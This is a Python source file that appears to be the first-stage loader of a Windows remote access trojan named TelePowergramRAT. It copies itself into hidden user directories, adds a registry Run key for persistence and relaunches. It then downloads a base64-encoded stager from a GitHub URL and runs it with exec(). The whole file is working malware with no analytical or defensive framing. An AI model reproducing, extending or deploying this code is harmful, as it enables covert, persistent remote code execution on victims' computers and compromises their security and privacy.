from config import *
import os

# print(os.name)
if os.name != "nt":
    print("Not windows! ")
    exit()



#main imports
from base64 import b64decode
import urllib.request
import sys
import subprocess
import requests
import json
from urllib import request, parse
from time import sleep





#Check Internet Connection

notconnected = True
while notconnected:
    try:
        urllib.request.urlopen("https://google.com")
        notconnected = False
    except:
        pass

#Stage1

def runcmd(command):
    out  = subprocess.check_output(command, shell=True, text=True)
    return out
def stager1(URL):
    "Stager 1 download"
    with urllib.request.urlopen(URL) as url:
        return url.read()


def persistencebyregkey(Nameofkey,PathofFile):
    command = f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v {Nameofkey} /t REG_SZ /d {PathofFile}'
    return runcmd(command)
def removePersistence(Nameofkey):
    command = f'reg delete "\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v {Nameofkey} '
    print(command)
    return runcmd(command)
#File Location
def checkfilelocation():
    Directories = [APPDATADIR,LOCALAPPDATADIR,TEMPDIR]
    for Directory in Directories:
        if not os.path.exists(Directory):
            os.makedirs(Directory)
            print(runcmd(f'attrib +h "{Directory}"'))
    
            current_dir = os.getcwd()
            if current_dir != Directory:
                curr = open(sys.argv[0],'rb')
                cont = curr.read()
                curr.close()
                f = open(Directory+"\\"+APPNAME,'wb')
                f.write(cont)
                f.close()
                sleep(10)
                print("[running persistence]")
                if Directory == APPDATADIR:
                    print("True")
                    persistencebyregkey(NAMEOFREGKEY,Directory+"\\"+APPNAME)
                os.startfile(Directory+"\\"+APPNAME)
                sys.exit()





            
# persistencebyregkey("EvilKey",os.path.abspath(sys.argv[0]))
# print(removePersistence("EvilKey"))


if __name__=="__main__":
    # removePersistence(NAMEOFREGKEY)
    # exit()
    checkfilelocation()
    print("[Starting stager..]")
    stager1 = b64decode(stager1("https://raw.githubusercontent.com/siddhant385/TelePowergramRAT/main/resources/encstager1.txt")).decode()
    # print(stager1)
    exec(stager1)

